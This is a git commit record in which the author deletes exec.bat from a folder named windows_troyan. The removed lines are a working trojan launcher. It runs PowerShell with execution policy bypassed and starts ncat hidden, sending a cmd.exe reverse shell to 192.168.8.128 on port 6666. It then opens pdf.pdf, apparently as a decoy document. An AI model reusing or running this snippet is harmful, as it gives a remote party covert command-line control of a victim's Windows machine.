b6dcf439f706024438159e90dcecde86022d09d6
Lorenzo Fornara <60841743+h4shell@users.noreply.github.com>
2025-03-20 16:58:18 +0100

    Delete windows_troyan/exec.bat

--- windows_troyan/exec.bat
+++
@@ -1,3 +0,0 @@
-@echo off
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '.\ncat.exe' -ArgumentList '192.168.8.128 6666 -e cmd.exe' -WindowStyle Hidden"
-pdf.pdf
